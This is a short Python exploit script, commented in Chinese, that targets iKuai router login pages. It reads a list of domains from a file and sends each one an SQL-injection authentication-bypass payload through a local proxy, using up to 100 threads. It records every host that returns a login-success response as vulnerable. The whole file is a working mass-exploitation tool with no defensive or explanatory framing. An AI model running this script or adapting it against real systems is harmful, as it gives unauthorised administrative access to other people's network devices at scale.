# ikuai sql注入
# 作者 charis 周家豪
# 时间 2022/11/24

import requests
from requests.packages import urllib3
urllib3.disable_warnings()
from threading import Thread, enumerate
from time import sleep


headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Accept-Language": "gzip, deflate"
}

post = r'user="or""=""or""="&pass='

proxies = {
    "http": "http://127.0.0.1:10811",
    "https": "https://127.0.0.1:10811",
}

def postData(url, post, headers, proxies):
    try:
        s = ""
        urldata = url.strip("\n") + "/login/x"
        requests.packages.urllib3.disable_warnings()
        re = requests.post(urldata, data=str(post), headers=headers, proxies=proxies, verify=False)
        if re.text == r'{"recode":0,"error":"\u767b\u5f55\u6210\u529f"}':
            print("[+]存在漏洞", url)
            s += url
        with open("D:\\code\\python\\exp\\ikuai\\result.txt", "a", encoding="utf-8") as f:
            f.write(s)
    except requests.exceptions.ConnectionError:
        pass

with open("D:\\code\\python\\exp\\ikuai\\domain.txt") as f:
    for i in f.readlines():
        if len(enumerate()) < 100:
            Thread(target=postData, args=(i, post, headers, proxies)).start()
        else:
            sleep(1)